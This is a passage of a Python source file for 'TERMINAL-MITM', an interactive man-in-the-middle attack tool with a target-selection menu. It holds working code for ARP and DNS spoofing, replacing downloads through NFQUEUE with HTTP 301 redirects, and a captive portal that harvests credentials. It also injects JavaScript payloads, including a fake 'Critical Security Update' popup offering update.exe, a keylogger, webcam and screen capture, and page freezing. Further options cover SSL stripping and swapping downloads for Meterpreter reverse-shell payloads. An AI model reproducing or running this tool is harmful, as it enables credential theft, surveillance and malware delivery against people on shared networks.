                                       an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=my_ip)))
                        send(spoofed, iface=iface, verbose=0)
                        log(f"[PORTAL] DNS {name.rstrip('.')} → {my_ip}", C.DIM)
                sniff(filter="udp port 53", prn=respond, store=0, iface=iface,
                      stop_filter=lambda _: not st.dns_active)
            threading.Thread(target=_dns_run, daemon=True).start()
        st.captive_active = True
        log(f"[PORTAL] Captive portal active on {my_ip}:80  — creds → portal_creds.log", C.GREEN)


# ── Attack: Custom File Replace (Linux+NFQUEUE, no Metasploit needed) ─────────
# Serves any local file from the HTTP server and intercepts downloads of a given
# extension, redirecting the target's browser to the served file via HTTP 301.

_filereplace_info: dict = {"fname": "", "ext": b""}

def start_file_replace(iface: str, my_ip: str, target_ip: str, gw_ip: str,
                       local_path: str, ext: str):
    if not LINUX:
        log("[FILE] Available on Linux only", C.RED); return
    if not HAS_NFQ:
        log("[FILE] NetfilterQueue not installed", C.RED); return
    if st.ssl_active or st.payload_active:
        log("[FILE] Disable SSL Strip / Metasploit first (share NFQUEUE queue 0)", C.RED); return
    if not os.path.isfile(local_path):
        log(f"[FILE] File not found: {local_path}", C.RED); return

    import shutil
    fname = os.path.basename(local_path)
    dest  = os.path.join(os.getcwd(), fname)
    if os.path.abspath(local_path) != dest:
        shutil.copy2(local_path, dest)

    pext = ext.encode() if not ext.startswith(".") else ext.encode()
    _filereplace_info["fname"] = fname
    _filereplace_info["ext"]   = pext

    _start_arp(target_ip, gw_ip, iface)
    _start_http(my_ip)
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    st.filereplace_active = True

    def _run():
        acks: list = []
        def process(pkt):
            sp = IP(pkt.get_payload())
            if sp.haslayer(Raw) and sp.haslayer(TCP):
                if sp[TCP].dport == 80 and pext in sp[Raw].load:
                    log(f"[FILE] Download detected ({ext}) from {sp[IP].src}", C.GREEN)
                    acks.append(sp[TCP].ack)
                elif sp[TCP].sport == 80 and sp[TCP].seq in acks:
                    acks.remove(sp[TCP].seq)
                    redir = (f"HTTP/1.1 301 Moved Permanently\r\n"
                             f"Location: http://{my_ip}:8000/{fname}\r\n"
                             f"Content-Length: 0\r\n\r\n")
                    sp[Raw].load = redir.encode()
                    del sp[IP].len; del sp[IP].chksum; del sp[TCP].chksum
                    pkt.set_payload(bytes(sp))
                    log(f"[FILE] Replaced with '{fname}'!", C.GREEN)
            pkt.accept()
        log(f"[FILE] Waiting for {ext} download — will serve '{fname}'", C.GREEN)
        q = NetfilterQueue()
        q.bind(0, process)
        try:
            q.run(stop_filter=lambda: not st.filereplace_active)
        finally:
            q.unbind()
        log("[FILE] File replace stopped", C.YELLOW)
    threading.Thread(target=_run, daemon=True).start()

def stop_file_replace():
    st.filereplace_active = False
    subprocess.run(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"],
                   stderr=subprocess.DEVNULL)
    _maybe_stop_arp()
    _maybe_stop_http()


# ── Guided submenus ──────────────────────────────────────────────────────────

def _ask_image(my_ip: str, label: str = "Image") -> str:
    """Ask user to drag an image file. Copies it to CWD and returns the serve URL."""
    print(f"  {C.DIM}Drag your image file into this window and press Enter,")
    print(f"  or type the full path manually.{C.END}")
    print(f"  Supported formats: jpg, png, gif, webp, bmp\n")
    fpath = ask_file(f"  {C.YELLOW}{label}: {C.END}")
    if not fpath:
        return ""
    if not os.path.isfile(fpath):
        log(f"[IMG] File not found: {fpath}", C.RED)
        return ""
    ext  = os.path.splitext(fpath)[1].lower() or ".jpg"
    fname = _serve_file(fpath, f"_mitm_img{ext}")
    return f"http://{my_ip}:8000/{fname}"

def injection_submenu(iface: str, my_ip: str, target_ip: str, gw_ip: str):
    """Guided submenu for option 8 — pre-built JS/HTML payloads."""
    clear_screen()
    _attack_header(
        "JS / HTML Injection — choose a payload",
        "The selected code is silently injected into every HTTP page the target visits."
    )
    menu = [
        ("1", "Full-page image overlay ",  "Cover the entire browser window with your image"),
        ("2", "Fake alert / popup      ",  "Show a JavaScript alert dialog with your message"),
        ("3", "Page redirect           ",  "Silently redirect the target to any URL"),
        ("4", "Scrolling banner        ",  "Red banner at the bottom with custom text"),
        ("5", "Freeze page             ",  "Block all clicks and keyboard input on the page"),
        ("6", "Fake browser update     ",  "\"Update Now\" popup that links to your file"),
        ("7", "Load from file          ",  "Inject raw HTML/JS from a local file"),
    ]
    for key, name, desc in menu:
        print(f"  [{C.BOLD}{key}{C.END}] {name}  {C.DIM}{desc}{C.END}")

    sub = input(f"\n  {C.YELLOW}Choice (1-7): {C.END}").strip()
    code = ""

    if sub == "1":
        # ── Full-page image overlay
        clear_screen()
        _attack_header("Full-page Image Overlay",
                       "Your image will cover 100% of the screen on every page.")
        img_url = _ask_image(my_ip)
        if not img_url:
            return
        code = (f'<style>#__ov{{position:fixed;top:0;left:0;width:100%;height:100%;'
                f'z-index:2147483647;background:url("{img_url}") center/cover no-repeat;'
                f'pointer-events:none}}</style><div id="__ov"></div>')
        log(f"[INJECT] Overlay ready — serving image from {img_url}", C.GREEN)

    elif sub == "2":
        # ── Fake alert
        clear_screen()
        _attack_header("Fake Alert Popup",
                       "A JavaScript alert() appears on every page the target opens.")
        msg = input(f"  {C.YELLOW}Alert message [{C.DIM}Security Alert: Your session has expired.{C.YELLOW}]: {C.END}").strip()
        if not msg:
            msg = "Security Alert: Your session has expired. Please log in again."
        delay = input(f"  {C.YELLOW}Delay in seconds [0.5]: {C.END}").strip() or "0.5"
        ms = int(float(delay) * 1000)
        code = f"<script>setTimeout(function(){{alert({json.dumps(msg)});}},{ms});</script>"

    elif sub == "3":
        # ── Page redirect
        clear_screen()
        _attack_header("Page Redirect",
                       "The target is silently redirected to a URL of your choice.")
        url = input(f"  {C.YELLOW}Redirect URL: {C.END}").strip()
        if not url:
            log("[INJECT] No URL provided — cancelled", C.YELLOW)
            return
        delay = input(f"  {C.YELLOW}Delay in seconds [1]: {C.END}").strip() or "1"
        ms = int(float(delay) * 1000)
        code = (f"<script>setTimeout(function(){{"
                f"window.location.href={json.dumps(url)};}},{ms});</script>")

    elif sub == "4":
        # ── Scrolling banner
        clear_screen()
        _attack_header("Scrolling Banner",
                       "A red marquee banner appears at the bottom of every page.")
        text = input(f"  {C.YELLOW}Banner text [{C.DIM}⚠ This connection is being monitored.{C.YELLOW}]: {C.END}").strip()
        if not text:
            text = "⚠ This connection is being monitored."
        code = (f'<style>#__bn{{position:fixed;bottom:0;left:0;width:100%;background:#c00;'
                f'color:#fff;padding:10px 0;font-size:17px;font-weight:bold;'
                f'z-index:2147483647;text-align:center;white-space:nowrap;overflow:hidden}}'
                f'#__bn span{{display:inline-block;'
                f'animation:__sc 14s linear infinite}}'
                f'@keyframes __sc{{from{{transform:translateX(100vw)}}'
                f'to{{transform:translateX(-100%)}}}}'
                f'</style><div id="__bn"><span>{text}&nbsp;&nbsp;&nbsp;'
                f'{text}&nbsp;&nbsp;&nbsp;</span></div>')

    elif sub == "5":
        # ── Freeze page
        clear_screen()
        _attack_header("Freeze Page",
                       "All clicks, scrolling, and keyboard input are silently blocked.")
        code = (f'<style>#__fr{{position:fixed;top:0;left:0;width:100%;height:100%;'
                f'z-index:2147483647;background:rgba(0,0,0,.01);cursor:not-allowed}}'
                f'</style><div id="__fr"></div>'
                f'<script>'
                f'["click","contextmenu","keydown","keyup","keypress","scroll"]'
                f'.forEach(function(e){{'
                f'document.addEventListener(e,function(x){{'
                f'x.preventDefault();x.stopPropagation();}},'
                f'{{capture:true,passive:false}});}});</script>')

    elif sub == "6":
        # ── Fake browser update popup
        clear_screen()
        _attack_header("Fake Browser Update",
                       "A \"Critical Update\" card appears bottom-right. The download button\n"
                       "  links to a file you serve (put update.exe next to Terminal.py).")
        dl_fname = input(f"  {C.YELLOW}Filename to offer for download [update.exe]: {C.END}").strip() or "update.exe"
        dl_url   = f"http://{my_ip}:8000/{dl_fname}"
        code = (f'<style>'
                f'#__up{{position:fixed;bottom:20px;right:20px;width:290px;background:#fff;'
                f'border-radius:8px;padding:14px 16px;z-index:2147483647;'
                f'box-shadow:0 4px 24px rgba(0,0,0,.28);font-family:Arial,sans-serif;'
                f'border-left:5px solid #1a73e8}}'
                f'#__up h3{{margin:0 0 5px;font-size:13px;color:#202124}}'
                f'#__up p{{margin:0 0 10px;font-size:11px;color:#5f6368;line-height:1.4}}'
                f'#__up .btn{{background:#1a73e8;color:#fff;border:none;'
                f'padding:7px 18px;border-radius:4px;font-size:12px;cursor:pointer;font-weight:bold}}'
                f'#__up .cl{{float:right;cursor:pointer;color:#aaa;'
                f'font-size:18px;line-height:1;margin:-2px -4px 0 0}}'
                f'</style>'
                f'<div id="__up">'
                f'<span class="cl" onclick="this.parentNode.remove()">&#10005;</span>'
                f'<h3>&#128274; Critical Security Update</h3>'
                f'<p>Your browser requires an urgent security patch. '
                f'Update now to protect your data.</p>'
                f'<button class="btn" onclick="window.location={json.dumps(dl_url)}">'
                f'Update Now</button>'
                f'</div>')
        log(f"[INJECT] Popup links to {dl_url} — place your file in the same folder", C.YELLOW)

    elif sub == "7":
        # ── Load from file
        clear_screen()
        _attack_header("Inject from File",
                       "Drag your .html or .js file into this window and press Enter.")
        fpath = ask_file(f"  {C.YELLOW}File: {C.END}")
        if not fpath or not os.path.isfile(fpath):
            log("[INJECT] File not found — cancelled", C.RED)
            return
        try:
            with open(fpath, encoding="utf-8") as f:
                code = f.read()
            log(f"[INJECT] Loaded {len(code)} bytes from {os.path.basename(fpath)}", C.GREEN)
        except Exception as e:
            log(f"[INJECT] Read error: {e}", C.RED)
            return
    else:
        log("[INJECT] Invalid choice", C.RED)
        return

    if code:
        toggle_custom_js(iface, my_ip, target_ip, gw_ip, code)


# ── TUI drawing ───────────────────────────────────────────────────────────────
W = 64

def _dot(active: bool) -> str:
    return f"{C.GREEN}● ACTIVE  {C.END}" if active else f"{C.DIM}○ inactive{C.END}"

def _svc(active: bool, label: str) -> str:
    if active:
        return f"{C.GREEN}[{label}]{C.END}"
    return f"{C.DIM}[{label} off]{C.END}"

def draw_ui(target: dict, my_ip: str, iface: str, gw_ip: str):
    clear_screen()

    # Header
    print(f"{C.CYAN}{C.BOLD}{'═' * W}")
    print(f"  TERMINAL-MITM  ·  Man-in-the-Middle Framework  ·  Singh Probjot")
    print(f"{'═' * W}{C.END}")

    # Target panel
    print(f"\n{C.BOLD} TARGET {'─' * (W - 8)}{C.END}")
    print(f"  IP        {C.WHITE}{target['ip']:<18}{C.END} MAC      {C.WHITE}{target['mac']}{C.END}")
    print(f"  Hostname  {C.WHITE}{target['hostname']:<18}{C.END} Vendor   {C.WHITE}{target['vendor']}{C.END}")
    print(f"  OS        {C.WHITE}{target['os']:<18}{C.END} Gateway  {C.WHITE}{gw_ip}{C.END}")
    print(f"  Attacker  {C.WHITE}{my_ip:<18}{C.END} Iface    {C.WHITE}{iface}{C.END}")

    # Services panel
    print(f"\n{C.BOLD} SERVICES {'─' * (W - 10)}{C.END}")
    arp_lbl  = "ARP SPOOF"
    http_lbl = f"HTTP :{st.attacker_ip}:8000" if st.http_active else "HTTP SERVER"
    print(f"  {_svc(st.arp_active, arp_lbl)}   {_svc(st.http_active, http_lbl)}")
    print(f"  {C.DIM}(Services auto-managed by attacks — no manual config needed){C.END}")

    # Attacks panel
    print(f"\n{C.BOLD} ATTACKS {'─' * (W - 9)}{C.END}")

    inj = st.inject_type  # current injection type or ""

    rows = [
        ("1", "Packet Capture    ", st.pcap_active,                  ""),
        ("2", "Credential Sniffer", st.cred_active,                  "auto: ARP"),
        ("3", "DNS Spoofing      ", st.dns_active,                   "auto: ARP"),
        ("4", "JS Keylogger      ", inj == "keylogger",              "auto: ARP+HTTP"),
        ("5", "Webcam Capture    ", inj == "webcam",                 "auto: ARP+HTTP"),
        ("6", "Screen Capture    ", inj == "screen",                 "auto: ARP+HTTP"),
        ("7", "Image Replace     ", inj == "image",                  "auto: ARP+HTTP"),
        ("8", "Custom JS/HTML    ", inj == "custom",                 "auto: ARP+HTTP"),
        ("9", "SSL Stripping     ", st.ssl_active,                   "auto: ARP  [Linux]"),
        ("0", "Metasploit Deliver", st.payload_active,               "auto: ARP+HTTP [Linux]"),
        ("A", "HTTP Traffic Log  ", st.http_log_active,              "auto: ARP  → http_log.txt"),
        ("B", "Captive Portal    ", st.captive_active,               "auto: ARP+DNS → portal_creds.log"),
        ("C", "Custom File Repl. ", st.filereplace_active,           "auto: ARP+HTTP [Linux]"),
    ]
    for key, name, active, note in rows:
        note_str = f"  {C.DIM}{note}{C.END}" if note else ""
        print(f"  [{C.BOLD}{key}{C.END}] {name}  {_dot(active)}{note_str}")

    # Log panel
    print(f"\n{C.BOLD} LOG {'─' * (W - 5)}{C.END}")
    with _log_lock:
        lines = list(_log_buf[-10:])
    if not lines:
        print(f"  {C.DIM}No events yet.{C.END}")
    else:
        for l in lines:
            print(f"  {l}")

    # Footer
    print(f"\n{'─' * W}")
    print(f"  {C.DIM}Toggle: number/letter  ·  [R] release target & rescan  ·  [Q] quit{C.END}")


# ── Release-target helper (shared by [R] and cleanup) ────────────────────────
def _release_all(target_ip: str, gw_ip: str, iface: str):
    """Stop every active attack, restore ARP, flush iptables for this target."""
    st.arp_active         = False
    st.pcap_active        = False
    st.cred_active        = False
    st.dns_active         = False
    st.inject_active      = False
    st.inject_type        = ""
    st.ssl_active         = False
    st.payload_active     = False
    st.filereplace_active = False
    st.http_log_active    = False
    st.captive_active     = False
    st._captive_owns_dns  = False
    time.sleep(1.2)   # let threads notice the flags
    restore_arp(target_ip, gw_ip, iface)
    if LINUX:
        subprocess.run(["iptables", "--flush"])
    for srv in (st._http_srv, st._captive_srv):
        if srv:
            try:
                srv.shutdown()
                srv.server_close()
            except Exception:
                pass
    st._http_srv    = None
    st._captive_srv = None
    st.http_active  = False


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    if not is_admin():
        print(f"{C.RED}[!] Run with root / administrator privileges.{C.END}")
        sys.exit(1)

    iface = get_default_iface()
    my_ip, network = get_network_info(iface)
    gw_ip = get_gateway()

    if not iface or not my_ip or not gw_ip:
        print(f"{C.RED}[!] Cannot determine network configuration.{C.END}")
        sys.exit(1)

    ip_forward(True)

    # current_target is a mutable ref so the signal handler always sees the latest
    _ctx: dict = {"target_ip": None}

    def cleanup(*_):
        print(f"\n{C.YELLOW}[*] Shutting down — restoring network ...{C.END}")
        if _ctx["target_ip"]:
            _release_all(_ctx["target_ip"], gw_ip, iface)
        ip_forward(False)
        print(f"{C.GREEN}[+] Done.{C.END}")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    BANNER = f"""{C.CYAN}{C.BOLD}
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║    ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     ║
    ║    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║     ║
    ║       ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║     ║
    ║       ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     ║
    ║       ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗║
    ║       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝║
    ║                                                              ║
    ║                  MITM Network Testing Tool                   ║
    ║                       Educational Use Only                   ║
    ║                         by Singh Probjot                     ║
    ╚══════════════════════════════════════════════════════════════╝
{C.END}"""

    # ── Outer loop: target selection / rescan ─────────────────────────────────
    while True:
        clear_screen()
        print(BANNER)
        print(f"  Interface : {C.WHITE}{iface}{C.END}   "
              f"Attacker : {C.WHITE}{my_ip}{C.END}   "
              f"Network : {C.WHITE}{network}{C.END}\n")

        devices = scan_network(network)
        if not devices:
            print(f"\n{C.RED}  No devices found — retrying in 5 s ...{C.END}")
            time.sleep(5)
            continue

        print(f"\n{C.BOLD}  {'ID':<5}{'IP':<20}{'MAC':<22}{'Hostname'}{C.END}")
        print("  " + "─" * 68)
        for i, d in enumerate(devices):
            print(f"  {i:<5}{d['ip']:<20}{d['mac']:<22}{d['hostname']}")

        print(f"\n  {C.DIM}[R] rescan   [Q] quit{C.END}")
        raw = input(f"\n{C.YELLOW}  [?] Target ID: {C.END}").strip().lower()

        if raw == "q":
            cleanup()
        if raw == "r":
            continue
        try:
            t = devices[int(raw)]
        except (ValueError, IndexError):
            print(f"{C.RED}  Invalid ID — press Enter to retry.{C.END}")
            input()
            continue

        print(f"\n{C.YELLOW}  [*] Fingerprinting OS ...{C.END}")
        t["os"] = guess_os(t["ip"])
        print(f"{C.YELLOW}  [*] Fetching vendor info ...{C.END}")
        t["vendor"] = get_vendor(t["mac"])
        print(f"{C.GREEN}  [+] {t['ip']} | {t['os']} | {t['vendor']}{C.END}\n"
              f"  Press Enter to open the attack menu ...")
        input()

        _ctx["target_ip"] = t["ip"]
        with _log_lock:
            _log_buf.clear()
        log(f"Session started — target {t['ip']} ({t['os']})", C.GREEN)

        # ── Inner loop: attack menu ───────────────────────────────────────────
        while True:
            draw_ui(t, my_ip, iface, gw_ip)
            try:
                choice = input(f"\n  {C.YELLOW}Option: {C.END}").strip().lower()
            except EOFError:
                cleanup()

            if choice == "q":
                cleanup()

            elif choice == "r":
                # Release this target, clear state, go back to discovery
                print(f"\n{C.YELLOW}  [*] Releasing {t['ip']} — stopping attacks & restoring ARP ...{C.END}")
                _release_all(t["ip"], gw_ip, iface)
                _ctx["target_ip"] = None
                with _log_lock:
                    _log_buf.clear()
                print(f"{C.GREEN}  [+] Released. Returning to discovery ...{C.END}")
                time.sleep(1)
                break   # → outer loop (rescan)

            elif choice == "1":
                toggle_pcap(iface)

            elif choice == "2":
                toggle_cred(iface, t["ip"], gw_ip)

            elif choice == "3":
                if st.dns_active:
                    toggle_dns(iface, my_ip, t["ip"], gw_ip)
                else:
                    clear_screen()
                    _attack_header(
                        "DNS Spoofing",
                        "Every DNS query from the target is answered with YOUR IP.\n"
                        "  Effect: the target's browser is redirected to you when it\n"
                        "  tries to resolve any domain. Combine with Captive Portal [B]\n"
                        "  for credential harvesting, or use standalone for misdirection."
                    )
                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
                    toggle_dns(iface, my_ip, t["ip"], gw_ip)

            elif choice == "4":
                if st.inject_type == "keylogger":
                    _stop_inject()
                    log("[KEYLOG] Stopped", C.YELLOW)
                elif st.inject_active:
                    log(f"[KEYLOG] Stop '{st.inject_type}' first", C.RED)
                else:
                    clear_screen()
                    _attack_header(
                        "JS Keylogger",
                        "Injects a tiny keylogger script into every HTTP page.\n"
                        "  Every key the target types is silently sent to your machine\n"
                        "  every 3 seconds and saved to  keylog.txt.\n"
                        "  Works only on HTTP pages (not HTTPS)."
                    )
                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
                    toggle_keylogger(iface, my_ip, t["ip"], gw_ip)

            elif choice == "5":
                if st.inject_type == "webcam":
                    _stop_inject()
                    log("[WEBCAM] Stopped", C.YELLOW)
                elif st.inject_active:
                    log(f"[WEBCAM] Stop '{st.inject_type}' first", C.RED)
                else:
                    clear_screen()
                    _attack_header(
                        "Webcam Capture",
                        "Injects JS that requests camera access via the browser API.\n"
                        "  If the target accepts the browser permission prompt, a photo\n"
                        "  is taken silently and saved as  webcam_<timestamp>.jpg.\n"
                        "  ⚠  Modern browsers require HTTPS for camera access —\n"
                        "     works only on HTTP-only pages."
                    )
                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
                    toggle_webcam(iface, my_ip, t["ip"], gw_ip)

            elif choice == "6":
                if st.inject_type == "screen":
                    _stop_inject()
                    log("[SCREEN] Stopped", C.YELLOW)
                elif st.inject_active:
                    log(f"[SCREEN] Stop '{st.inject_type}' first", C.RED)
                else:
                    clear_screen()
                    _attack_header(
                        "Screen Capture",
                        "Injects JS that requests screen-share access (getDisplayMedia).\n"
                        "  The target sees a browser prompt asking to share their screen.\n"
                        "  A signal is logged every 5 s when the stream is active.\n"
                        "  ⚠  Modern browsers require HTTPS — works on HTTP-only pages."
                    )
                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
                    toggle_screen(iface, my_ip, t["ip"], gw_ip)

            elif choice == "7":
                # ── Guided image replace ──────────────────────────────────────
                if st.inject_type == "image":
                    _stop_inject()
                    log("[IMG] Stopped", C.YELLOW)
                elif st.inject_active:
                    log(f"[IMG] Stop '{st.inject_type}' first", C.RED)
                else:
                    clear_screen()
                    _attack_header(
                        "Image Replace",
                        "Replaces ALL <img> tags on every HTTP page with your image.\n"
                        "  Works on HTTP sites only."
                    )
                    img_url = _ask_image(my_ip)
                    if img_url:
                        # toggle_image_replace uses replace.jpg from CWD —
                        # _ask_image already copied the file as _mitm_img.*
                        # Re-use the custom JS path so any format works.
                        js = (f"window.onload=function(){{"
                              f"var i=document.getElementsByTagName('img');"
                              f"for(var x=0;x<i.length;x++){{i[x].src='{img_url}';}}"
                              f"}};")
                        payload = f"<script>{js}</script>"
                        _start_http(my_ip)
                        _start_inject(iface, my_ip, t["ip"], gw_ip, "image", payload)

            elif choice == "8":
                # ── Guided injection submenu ──────────────────────────────────
                if st.inject_type == "custom":
                    _stop_inject()
                    log("[INJECT] Stopped", C.YELLOW)
                elif st.inject_active:
                    log(f"[INJECT] Stop '{st.inject_type}' first", C.RED)
                else:
                    injection_submenu(iface, my_ip, t["ip"], gw_ip)

            elif choice == "9":
                if st.ssl_active:
                    toggle_ssl(iface, t["ip"], gw_ip)
                else:
                    clear_screen()
                    _attack_header(
                        "SSL Stripping  (Linux + NFQUEUE)",
                        "Downgrades HTTPS links to HTTP in real time.\n"
                        "  When combined with Credential Sniffer [2] or Keylogger [4],\n"
                        "  data sent over 'HTTPS' sites becomes readable.\n"
                        "  ⚠  HSTS-preloaded sites (Google, Facebook …) are immune.\n"
                        "  Requires ARP Spoofing — auto-started."
                    )
                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
                    toggle_ssl(iface, t["ip"], gw_ip)

            elif choice == "a":
                if st.http_log_active:
                    toggle_http_log(iface, t["ip"], gw_ip)
                else:
                    clear_screen()
                    _attack_header(
                        "HTTP Traffic Logger",
                        "Passively logs every HTTP request the target makes:\n"
                        "  URLs visited, cookies, User-Agent, POST body.\n"
                        "  Everything saved to  http_log.txt  in real time.\n"
                        "  Works silently — no JS injection needed."
                    )
                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
                    toggle_http_log(iface, t["ip"], gw_ip)

            elif choice == "b":
                if st.captive_active:
                    toggle_captive(iface, my_ip, t["ip"], gw_ip)
                else:
                    clear_screen()
                    _attack_header(
                        "Captive Portal — Credential Harvesting",
                        "Redirects ALL DNS queries to your machine, then serves a\n"
                        "  convincing 'Network Sign-In' login page on port 80.\n"
                        "  When the target submits credentials they are saved to\n"
                        "  portal_creds.log  and shown live in the LOG panel.\n"
                        "  Works on ANY browser, including HTTPS-first ones."
                    )
                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
                    toggle_captive(iface, my_ip, t["ip"], gw_ip)

            elif choice == "c":
                # ── Guided custom file replace ────────────────────────────────
                if st.filereplace_active:
                    stop_file_replace()
                else:
                    clear_screen()
                    _attack_header(
                        "Custom File Replace  (Linux + NFQUEUE)",
                        "When the target clicks an HTTP download link whose extension\n"
                        "  matches what you choose, their browser receives YOUR file\n"
                        "  instead — completely transparently.\n"
                        "  Example: intercept .pdf → deliver a weaponised .pdf."
                    )
                    print(f"  {C.DIM}Drag your replacement file into this window and press Enter:{C.END}\n")
                    fpath = ask_file(f"  {C.YELLOW}Your file: {C.END}")
                    if not fpath or not os.path.isfile(fpath):
                        log("[FILE] File not found — cancelled", C.RED)
                    else:
                        auto_ext = os.path.splitext(fpath)[1]
                        ext_hint = f" [{auto_ext}]" if auto_ext else ""
                        ext = input(
                            f"  {C.YELLOW}Extension to intercept{ext_hint} "
                            f"(Enter to use file's own): {C.END}"
                        ).strip()
                        if not ext:
                            ext = auto_ext
                        if not ext:
                            log("[FILE] No extension — cancelled", C.RED)
                        else:
                            if not ext.startswith("."):
                                ext = "." + ext
                            start_file_replace(iface, my_ip, t["ip"], gw_ip, fpath, ext)

            elif choice == "0":
                if st.payload_active:
                    stop_payload()
                else:
                    if not LINUX:
                        log("[PAYLOAD] Linux only", C.RED)
                    elif not HAS_NFQ:
                        log("[PAYLOAD] NetfilterQueue not installed: pip install NetfilterQueue", C.RED)
                    elif st.ssl_active or st.filereplace_active:
                        log("[PAYLOAD] Disable SSL Strip / File Replace first (same NFQUEUE)", C.RED)
                    else:
                        clear_screen()
                        _attack_header(
                            "Metasploit Payload Delivery  (Linux + NFQUEUE)",
                            "Automatically generates a Meterpreter reverse shell and\n"
                            "  replaces any matching download the target makes.\n"
                            "  A listener is opened in a new terminal window.\n"
                            f"  Detected OS: {t['os']}"
                        )
                        rec_win = f"  {C.GREEN}← Recommended for {t['os']}{C.END}" if "Windows" in t["os"] else ""
                        rec_lin = f"  {C.GREEN}← Recommended for {t['os']}{C.END}" if "Linux" in t["os"] or "Android" in t["os"] else ""
                        print(f"  [1] Windows  .exe{rec_win}")
                        print(f"  [2] Android  .apk{rec_lin}")
                        print(f"  [3] Linux    .elf{rec_lin}")
                        osc = input(f"\n  {C.YELLOW}Target OS (1-3): {C.END}").strip()
                        cfg = {
                            "1": ("windows/meterpreter/reverse_tcp", "exe",  "payload.exe", b".exe"),
                            "2": ("android/meterpreter/reverse_tcp", "raw",  "payload.apk", b".apk"),
                            "3": ("linux/x64/meterpreter/reverse_tcp", "elf", "payload.elf", b".elf"),
                        }
                        if osc in cfg:
                            start_payload(iface, my_ip, t["ip"], gw_ip, *cfg[osc])
                        else:
                            log("[PAYLOAD] Invalid choice", C.RED)

            # brief pause so background logs can accumulate before next redraw
            time.sleep(0.4)


if __name__ == "__main__":
    main()
